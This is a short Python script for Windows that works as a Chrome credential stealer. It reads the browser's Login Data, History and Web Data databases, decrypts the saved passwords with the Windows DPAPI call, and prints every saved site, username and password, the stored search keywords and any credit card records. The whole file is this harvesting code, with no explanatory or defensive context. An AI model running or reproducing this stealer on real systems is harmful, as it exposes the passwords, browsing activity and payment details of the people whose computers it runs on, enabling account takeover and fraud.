from __future__ import print_function
from os import getenv
import sqlite3
import win32crypt
conn = sqlite3.connect(getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\Login Data")
conn3 = sqlite3.connect(getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\History")
conn1 = sqlite3.connect(getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\Web Data")
cursor3 = conn3.cursor()
cursor1 = conn1.cursor()
cursor = conn.cursor()
cursor.execute('SELECT action_url, username_value, password_value FROM logins')
for result in cursor.fetchall():
	password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
	if password:
		print("Site: " + result[0])
		print('Username: ' + result[1])
		print('Password: ' + password)
		print('---------------------------------------------')
cursor3.execute("SELECT * FROM keyword_search_terms") 
print('---------------------------------------------')
print("Google Keyword Searches:")
result = cursor3.fetchall() 
for r in result:
    print(r)

cursor1.execute("SELECT * FROM credit_cards")
print('---------------------------------------------')
print("Credit Card Data:")
result = cursor1.fetchall() 
for r in result:
    print(r)


